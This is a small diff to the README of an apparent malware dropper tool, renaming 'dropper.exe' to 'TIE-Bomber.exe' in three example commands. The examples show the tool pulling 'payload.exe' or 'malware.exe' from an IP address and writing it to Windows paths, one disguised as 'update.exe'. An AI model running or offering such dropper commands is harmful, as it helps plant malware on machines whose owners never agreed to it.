@@ -49,9 +49,9 @@ TIE-Bomber.exe -i <IP> -e <EXE> [options]
 ## Examples
 
 ```
-dropper.exe -i 192.168.1.100 -e payload.exe -t C:\Users\Public\drop.exe
-dropper.exe -i 10.0.0.2 -e malware.exe -p 9001 -s
-dropper.exe -P -t C:\Windows\Temp\update.exe
+TIE-Bomber.exe -i 192.168.1.100 -e payload.exe -t C:\Users\Public\drop.exe
+TIE-Bomber.exe -i 10.0.0.2 -e malware.exe -p 9001 -s
+TIE-Bomber.exe -P -t C:\Windows\Temp\update.exe
 ```
 
 ---
